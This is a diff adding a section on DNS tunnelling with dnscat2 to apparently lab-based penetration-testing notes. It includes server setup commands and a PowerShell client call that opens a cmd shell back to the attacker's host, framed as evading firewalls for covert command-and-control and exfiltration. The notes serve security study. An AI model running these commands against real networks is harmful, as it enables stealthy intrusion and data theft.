@@ -2079,8 +2079,6 @@ Address         Port        Address         Port
 
 After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
 
-
-
 <table width="100%">
 <tr>
 <td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
@@ -2105,3 +2103,328 @@ xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
 </details>
 
 </details>
+
+---
+
+<details>
+<summary><h1>🌿 Branching Out Our Tunnels</h1></summary>
+
+<details>
+<summary><h2>DNS Tunneling with Dnscat2</h2></summary>
+
+Dnscat2 is a tunneling tool designed to establish an encrypted Command and Control (C2) channel between two hosts (attacker server and victim client) using the fundamental DNS protocol.
+
+**Evasion Mechanism:**
+
+1. **Exploiting Allowed Traffic:** It capitalizes on the fact that DNS traffic (UDP port 53) is essential and is nearly always permitted through corporate firewalls and Intrusion Prevention Systems (IPS).
+
+2. **Encapsulated Exfiltration:** Instead of sending legitimate resolution requests, Dnscat2 encapsulates data (commands and stolen information) within the fields of DNS records, typically using TXT records.
+
+3. **Surreptitious Operation:** When the victim machine attempts to *"resolve"* a malicious domain, the query is directed through the internal DNS server, bypasses the corporate firewall, and eventually reaches the attacker's Dnscat2 server (C2). This achieves data exfiltration stealthily, evading detection based on inspection of web protocols like HTTPS/HTTP.
+
+In essence, Dnscat2 transforms an essential, low-inspection network protocol (DNS) into a secret communication channel.
+
+```mermaid
+flowchart LR
+    %% Node Definitions
+    subgraph ATT["**Attack Host (C&C Server)**<br/>10.10.15.5"]
+        direction TB
+        DNSCAT_S["**Dnscat2 Server**<br/>(🎧 Listener)"]
+    end
+    
+    subgraph CORP["**Corporate Network (Victim)** 🏢"]
+        direction TB
+        WIN_C["**Windows Host**<br/>(💻 Victim Client)"]
+        DNS_I["**Internal DNS Server** 📜"]
+        FIREWALL["**Firewall / IPS**<br/>(🛡️ Inspects HTTPS/HTTP)"]
+    end
+    
+    DNS_E["**External DNS Resolver**<br/>(🌎 e.g., 8.8.8.8)"]
+    
+    %% Connection and Exfiltration Flow
+    
+    %% 1. The client initiates a malicious 'DNS resolution' via its internal DNS server (not a legitimate query)
+    WIN_C -- 1. Execute Dnscat2 Client 👻 --> DNS_I
+    
+    %% 2. The internal DNS attempts to resolve the external request (which is the tunnel traffic)
+    DNS_I -- 2. Exfiltration Query (DNS) ❓ --> FIREWALL
+    
+    %% 3. The Firewall allows external DNS traffic (UDP port 53)
+    FIREWALL -- 3. Allowed Traffic (DNS) ✅ --> DNS_E
+    
+    %% 4. The external DNS cannot resolve the malicious domain and forwards it to the attacker's DNS server (the C&C Server)
+    DNS_E -- 4. Malicious DNS Query Forwarding ➡️ --> DNSCAT_S
+    
+    %% 5. The C&C Server encapsulates the response and returns the C&C command (in TXT Records)
+    DNSCAT_S -- 5. Encapsulated C2 Response (TXT Records) 📦 --> DNS_E
+    
+    %% 6. The C2 response returns to the client
+    DNS_E -- 6. C2 Response (TXT Records) ↩️ --> FIREWALL
+    FIREWALL -- 7. C2 Reply 📩 --> DNS_I
+    DNS_I -- 8. C2 Delivery to Client 🎯 --> WIN_C
+    
+    %% Tunnel Data Flow (Emphasis on Exfiltration)
+    WIN_C -.-|**DNS Tunnel 🚇 - TXT Records / Encrypted C2**| DNSCAT_S
+    
+    %% Styling
+    style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
+    style CORP fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
+    style DNSCAT_S fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style WIN_C fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style DNS_I fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style FIREWALL fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    style DNS_E fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
+    
+    %% Link Styling
+    %% Exfiltration Data Flow (Highlighted in Dashed Red for C2)
+    linkStyle 8 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
+```
+
+**Cloning dnscat2 and Setting Up the Server**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+
+</td>
+</tr>
+</table>
+
+**Starting the dnscat2 server**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+New window created: 0
+dnscat2> New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 10.10.14.18:53
+[domains = inlanefreight.local]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+```
+
+</td>
+</tr>
+</table>
+
+After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.
+
+**Cloning dnscat2-powershell to the Attack Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+
+</td>
+</tr>
+</table>
+
+Once the **dnscat2.ps1** file is on the target we can import it and run associated cmd-lets. After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
+
+**Importing dnscat2.ps1**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`PS C:\Users\User >`**
+
+</td>
+<td>
+
+```powershell
+Import-Module .\dnscat2.ps1
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+```
+
+</td>
+</tr>
+</table>
+
+We must use the pre-shared secret (-PreSharedSecret) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.
+
+**Confirming Session Establishment**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+# New window created: 1
+# Session 1 Security: ENCRYPTED AND VERIFIED!
+# (the security depends on the strength of your pre-shared secret!)
+
+dnscat2>
+```
+
+</td>
+</tr>
+</table>
+
+We can list the options we have with dnscat2 by entering ? at the prompt.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+dnscat2> ?
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```text
+Here is a list of commands (use -h on any of them for additional help):
+* echo
+* help
+* kill
+* quit
+* set
+* start
+* stop
+* tunnels
+* unset
+* window
+* windows
+```
+
+</td>
+</tr>
+</table>
+
+We can use dnscat2 to interact with sessions and move further in a target environment on engagements. Let's interact with our established session and drop into a shell.
+
+**Interacting with the Established Session**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+dnscat2> window -i 1
+# New window created: 1
+# history_size (session) => 1000
+# Session 1 Security: ENCRYPTED AND VERIFIED!
+# (the security depends on the strength of your pre-shared secret!)
+# This is a console session!
+
+# That means that anything you type will be sent as-is to the
+# client, and anything they type will be displayed as-is on the
+# screen! If the client is executing a command and you don't
+# see a prompt, try typing 'pwd' or something!
+
+# To go back, type ctrl-z.
+
+# Microsoft Windows [Version 10.0.18363.1801]
+# (c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+exec (OFFICEMANAGER) 1>
+```
+
+</td>
+</tr>
+</table>
+
+
+</details>
+
+</details>
+
+---
